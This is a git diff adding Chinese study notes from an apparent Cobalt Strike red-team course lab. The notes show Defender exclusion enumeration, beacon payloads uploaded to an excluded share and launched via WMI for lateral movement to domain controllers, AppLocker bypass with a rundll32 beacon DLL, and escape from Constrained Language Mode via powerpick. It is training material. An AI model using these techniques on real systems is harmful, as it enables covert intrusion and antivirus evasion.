@@ -300,4 +300,194 @@ post-ex {
 ![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661676676715.png)
 
 
-配置后：
+配置后，已经可以在dc-2使用Rubeus.exe：
+
+1661729759471.png
+
+# Exclusions
+
+枚举目标主机的exlusions规则
+
+这里教材说可以本地，也可以远程枚举，但是我只在远程枚举成功，本地枚举beacon会断掉
+```
+beacon> remote-exec winrm dc-2 Get-MpPreference | select Exclusion*
+[*] Tasked beacon to run 'Get-MpPreference | select Exclusion*' on dc-2 via WinRM
+[+] host called home, sent: 295 bytes
+[+] received output:
+
+
+ExclusionExtension : 
+ExclusionIpAddress : 
+ExclusionPath      : {C:\Shares\software}
+ExclusionProcess   : 
+PSComputerName     : dc-2
+RunspaceId         : 3e755110-a816-4d15-ade2-ab157e05e7bf
+
+
+[+] received output:
+#< CLIXML
+
+[+] received output:
+```
+
+1661730058127.png
+
+
+上传beacon-smb.exe,使用wmi触发成功。教材也有说使用winrm触发，但是我会报错
+```
+beacon> cd \\dc-2\c$\shares\software
+[*] cd \\dc-2\c$\shares\software
+[+] host called home, sent: 33 bytes
+beacon> upload C:\Payloads\beacon-smb.exe
+[*] Tasked beacon to upload C:\Payloads\beacon-smb.exe as beacon-smb.exe
+[+] host called home, sent: 311834 bytes
+beacon> remote-exec wmi dc-2 C:\Shares\Software\beacon-smb.exe
+[*] Tasked beacon to run 'C:\Shares\Software\beacon-smb.exe' on dc-2 via WMI
+[+] host called home, sent: 4400 bytes
+[+] received output:
+CoInitializeSecurity already called. Thread token (if there is one) may not get used
+[+] received output:
+Started process 4312 on dc-2
+beacon> link dc-2
+[*] Tasked to link to \\dc-2\pipe\msagent_dc
+[+] host called home, sent: 31 bytes
+[+] established link to child beacon: 10.10.17.71
+```
+
+1661731130002.png
+
+
+
+也可以用tcp beacon，同样使用wmi触发，然后connet目标端口
+
+```
+beacon> upload C:\Payloads\beacon-tcp-4444.exe
+[*] Tasked beacon to upload C:\Payloads\beacon-tcp-4444.exe as beacon-tcp-4444.exe
+[+] host called home, sent: 311839 bytes
+beacon> remote-exec winrm dc-2 cmd /c C:\Shares\Software\beacon\beacon-tcp-4444.exe
+[*] Tasked beacon to run 'cmd /c C:\Shares\Software\beacon\beacon-tcp-4444.exe' on dc-2 via WinRM
+[+] host called home, sent: 339 bytes
+[+] received output:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">The system cannot find the path specified._x000D__x000A_</S><S S="Error">    + CategoryInfo          : NotSpecified: (The system cann...path specified.:String) [], RemoteException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : NativeCommandError_x000D__x000A_</S><S S="Error">    + PSComputerName        : dc-2_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
+beacon> remote-exec wmi dc-2 C:\Shares\Software\beacon-tcp-4444.exe
+[*] Tasked beacon to run 'C:\Shares\Software\beacon-tcp-4444.exe' on dc-2 via WMI
+[+] host called home, sent: 4410 bytes
+[+] received output:
+CoInitializeSecurity already called. Thread token (if there is one) may not get used
+[+] received output:
+Started process 3464 on dc-2
+beacon> connect dc-2 4444
+[*] Tasked to connect to dc-2:4444
+[+] host called home, sent: 15 bytes
+[+] established link to child beacon: 10.10.17.71
+```
+
+
+1661731460113.png
+
+
+
+## 设置自己的Exclude文件夹
+
+```
+Set-MpPreference -ExclusionPath "<path>"
+```
+
+1661731798567.png
+
+
+# AppLocker Rule Bypasses
+
+枚举applocker，教材给的例子是分析Registry.pol文件
+
+
+但是如果已经有一个初始shell，那就有更简单的方法，只需要两行powershell
+
+```
+$ExecutionContext.SessionState.LanguageModeConstrainedLanguage
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
+1661732327423.png
+
+
+DLL 强制很少启用，因为它会给系统带来额外的负载，并且需要进行大量测试以确保不会出现任何问题
+
+Cobalt Strike 可以将 Beacon 输出到可以使用rundll32运行的 DLL 
+
+下面方法我在lab无法复现，因为我无法关掉dc-1的defender，这里知道有这种方法即可
+
+```
+C:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8A6C-CD61
+
+ Directory of C:\Users\Administrator\Desktop
+
+05/17/2021  11:01 PM    <DIR>          .
+05/17/2021  11:01 PM    <DIR>          ..
+05/17/2021  10:59 PM           311,808 beacon.dll
+
+C:\>C:\Windows\System32\rundll32.exe C:\Users\Administrator\Desktop\beacon.dll,StartW
+```
+
+```
+beacon> link dc-1
+[+] established link to child beacon: 10.10.15.75
+```
+
+
+# PowerShell Constrained Language Mode（CLM）
+
+枚举dc-1上是否有CLM
+
+```
+beacon> remote-exec winrm dc-1 $ExecutionContext.SessionState.LanguageMode
+[*] Tasked beacon to run '$ExecutionContext.SessionState.LanguageMode' on dc-1 via WinRM
+[+] host called home, sent: 327 bytes
+[+] received output:
+
+PSComputerName RunspaceId                           Value              
+-------------- ----------                           -----              
+dc-1           76353831-73f5-4234-8282-cf7125d13d6b ConstrainedLanguage
+
+```
+
+1661734556715.png
+
+
+无法使用winrm（powershell）
+
+1661734621007.png
+
+
+在dc-1上，使用powershell会马上断开（教材在这一步是会报错）
+
+1661734751787.png
+
+
+使用powerpic代替powershell，绕过CLM限制
+
+```
+beacon> run hostname
+[*] Tasked beacon to run: hostname
+[+] host called home, sent: 26 bytes
+[+] received output:
+dc-1
+
+beacon> powerpick $ExecutionContext.SessionState.LanguageMode
+[*] Tasked beacon to run: $ExecutionContext.SessionState.LanguageMode (unmanaged)
+[+] host called home, sent: 134767 bytes
+[+] received output:
+FullLanguage
+
+beacon> powerpick [math]::Pow(2,10)
+[*] Tasked beacon to run: [math]::Pow(2,10) (unmanaged)
+[+] host called home, sent: 134767 bytes
+[+] received output:
+1024
+
+```
+
+1661734876722.png
